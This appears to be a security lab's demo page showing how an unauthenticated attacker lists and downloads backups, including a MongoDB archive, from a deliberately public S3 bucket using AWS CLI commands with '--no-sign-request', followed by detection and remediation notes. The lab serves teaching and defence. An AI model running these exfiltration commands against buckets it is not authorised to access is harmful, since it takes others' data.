# S3 Exfiltration Demo

Step-by-step demonstration of exploiting the public S3 bucket.

## Overview

This demo shows how an attacker can access and exfiltrate data from a misconfigured public S3 bucket.

## Quick Demo

```bash
make demo-s3
```

## Manual Steps

### 1. Discover Bucket

```bash
# Get bucket name from terraform
BUCKET=$(cd terraform && terraform output -raw backup_bucket_name)
echo $BUCKET
```

### 2. List Contents (No Auth)

```bash
aws s3 ls s3://$BUCKET --no-sign-request
```

Output:
```
                           PRE backups/
2024-01-15 10:00:00       1234 README.txt
```

### 3. Download Files

```bash
# Download all backups
aws s3 sync s3://$BUCKET/backups/ ./loot/ --no-sign-request

# Or single file
aws s3 cp s3://$BUCKET/backups/mongodb-backup-latest.tar.gz . --no-sign-request
```

### 4. Extract Data

```bash
tar -xzf mongodb-backup-*.tar.gz
ls -la mongodb-backup-*/
```

## Detection

- GuardDuty: `Policy:S3/BucketPublicAccessGranted`
- CloudTrail: Anonymous `GetObject` events

## Remediation

Enable S3 Block Public Access. See [WIZ-001](../security/s3-public.md).
